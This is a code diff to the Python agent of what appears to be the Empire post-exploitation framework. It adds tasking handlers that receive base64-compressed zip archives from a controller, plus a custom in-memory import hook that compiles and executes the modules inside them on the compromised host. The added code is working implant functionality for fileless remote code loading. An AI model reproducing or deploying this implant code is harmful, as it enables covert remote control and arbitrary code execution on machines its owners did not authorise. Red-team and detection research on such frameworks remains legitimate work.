@@ -1,3 +1,4 @@
+import __future__
 import struct
 import time
 import base64
@@ -12,6 +13,9 @@ import shlex
 import zlib
 import threading
 import BaseHTTPServer
+import zipfile
+import io
+import imp
 from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
@@ -50,6 +54,9 @@ headersRaw = parts[2:]
 defaultResponse = base64.b64decode("")
 
 jobs = []
+moduleRepo = {}
+_meta_cache = {}
+
 
 # global header dictionary
 #   sessionID is set by stager.py
@@ -409,9 +416,163 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 122:
+        #base64 decode and decompress the data
+        try:
+            parts = data.split('|')
+            base64part = parts[1]
+            fileName = parts[0]
+            raw = base64.b64decode(base64part)
+            d = decompress()
+            dec_data = d.dec_data(raw, cheader=True)
+            if not dec_data['crc32_check']:
+                send_message(build_response_packet(122, "Failed crc32_check during decompression", resultID))
+        except Exception as e:
+            send_message(build_response_packet(122, "Unable to decompress zip file: %s" % (e), resultID))
+
+        zdata = dec_data['data']
+        zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
+        moduleRepo[fileName] = zf
+        install_hook(fileName)
+        send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+
+    elif packetType == 123:
+        #view loaded modules
+        repoName = data
+        if repoName == "":
+            loadedModules = "\nAll Repos\n"
+            for key, value in moduleRepo.items():
+                loadedModules += "\n----"+key+"----\n"
+                loadedModules += '\n'.join(moduleRepo[key].namelist())
+
+            send_message(build_response_packet(123, loadedModules, resultID))
+        else:
+            try:
+                loadedModules = "\n----"+repoName+"----\n"
+                loadedModules += '\n'.join(moduleRepo[repoName].namelist())
+                send_message(build_response_packet(123, loadedModules, resultID))
+            except Exception as e:
+                msg = "Unable to retrieve repo contents: %s" % (str(e))
+                send_message(build_response_packet(123, msg, resultID))
+
+    elif packetType == 124:
+        #remove module
+        repoName = data
+        try:
+            remove_hook(repoName)
+            del moduleRepo[repoName]
+            send_message(build_response_packet(124, "Successfully remove repo: %s" % (repoName), resultID))
+        except Exception as e:
+            send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
+
     else:
         return build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID)
 
+
+################################################
+#
+# Custom Import Hook
+# #adapted from https://github.com/sulinx/remote_importer
+#
+################################################
+
+# [0] = .py ext, is_package = False
+# [1] = /__init__.py ext, is_package = True
+_search_order = [('.py', False), ('/__init__.py', True)]
+
+class ZipImportError(ImportError):
+    """Exception raised by zipimporter objects."""
+
+# _get_info() = takes the fullname, then subpackage name (if applicable), 
+# and searches for the respective module or package
+
+class CFinder(object):
+    """Import Hook for Empire"""
+    def __init__(self, repoName):
+        self.repoName = repoName
+
+    def _get_info(self, repoName, fullname):
+        """Search for the respective package or module in the zipfile object"""
+        parts = fullname.split('.')
+        submodule = parts[-1]
+        modulepath = '/'.join(parts)
+
+        #check to see if that specific module exists
+
+        for suffix, is_package in _search_order:
+            relpath = modulepath + suffix
+            try:
+                moduleRepo[repoName].getinfo(relpath)
+            except KeyError:
+                pass
+            else:
+                return submodule, is_package, relpath
+
+        #Error out if we can find the module/package
+        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
+        raise ZipImportError(msg)
+
+    def _get_source(self, repoName, fullname):
+        """Get the source code for the requested module"""
+        submodule, is_package, relpath = self._get_info(repoName, fullname)
+        fullpath = '%s/%s' % (repoName, relpath)
+        source = moduleRepo[repoName].read(relpath)
+        source = source.replace('\r\n', '\n')
+        source = source.replace('\r', '\n')
+
+        return submodule, is_package, fullpath, source
+
+    def find_module(self, fullname, path=None):
+
+        try:
+            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
+        except ImportError:
+            return None
+        else:
+            return self
+
+    def load_module(self, fullname):
+        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
+        code = compile(source, fullpath, 'exec')
+        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
+        mod.__loader__ = self
+        mod.__file__ = fullpath
+        mod.__name__ = fullname
+        if is_package:
+            mod.__path__ = [os.path.dirname(mod.__file__)]
+        exec code in mod.__dict__
+        return mod
+
+    def get_data(self, fullpath):
+
+        prefix = os.path.join(self.repoName, '')
+        if not fullpath.startswith(prefix):
+            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
+        relpath = fullpath[len(prefix):]
+        try:
+            return moduleRepo[self.repoName].read(relpath)
+        except KeyError:
+            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))
+
+    def is_package(self, fullname):
+        """Return if the module is a package"""
+        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
+        return is_package
+
+    def get_code(self, fullname):
+        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
+        return compile(source, fullpath, 'exec')
+
+def install_hook(repoName):
+    if repoName not in _meta_cache:
+        finder = CFinder(repoName)
+        _meta_cache[repoName] = finder
+        sys.meta_path.append(finder)
+
+def remove_hook(repoName):
+    if repoName in _meta_cache:
+        finder = _meta_cache.pop(repoName)
+        sys.meta_path.remove(finder)
 
 ################################################
 #
